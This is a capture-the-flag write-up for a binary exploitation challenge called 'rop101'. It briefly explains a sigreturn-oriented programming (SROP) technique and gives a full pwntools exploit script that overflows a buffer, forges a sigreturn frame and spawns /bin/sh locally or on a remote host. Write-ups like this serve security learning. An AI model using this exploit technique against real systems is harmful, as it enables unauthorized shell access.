## Challenge Description

## Solution

This challenge was a simple SROP challenge. However, since we didn't have a gadget that could directly control `RAX`, we would make use of `READ` to read in `0xF` bytes so that RAX would contain `rt_sigreturn` syscall opcode, and then we would simply create the sigreturn frame, and jump to it.

The exploit for this is as follows, the only thing I added was a simple 2 second delay; that was to ensure that the bytes are sent properly.

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

exe = "./rop101"
elf = context.binary = ELF(exe)
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
# if args.GDB: gdb.attach(io, "b *main+40")
# io = gdb.debug(exe, gdbscript="b *main+40")

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = elf.bss(0)
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x401141

payload = flat(
    cyclic(24, n=8),
    0x0000000000401144, # pop rsi; ret
    elf.bss(0),
    0x000000000040113f, # xor eax, eax; syscall,
    0x0000000000401144, # pop rsi; ret
    elf.bss(0)+0x10,
    0x000000000040113f, # xor eax, eax; syscall
    0x0000000000401141, # syscall
    frame
)
io.send(payload)
io.sendline(flat(b"/bin/sh\x00"))
time.sleep(2)
io.send(b"A"*0xF)
io.interactive()
```
